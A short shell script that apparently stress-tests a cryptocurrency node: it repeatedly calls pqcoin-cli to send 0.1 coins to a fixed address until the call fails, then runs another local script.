sleep 0.1
while [ true ]; do
	pqcoin-cli sendtoaddress D6GJmUxPCe1AaF4Xd8nn3zngMjM7UQBvDq 0.1 || break
done
./a.sh
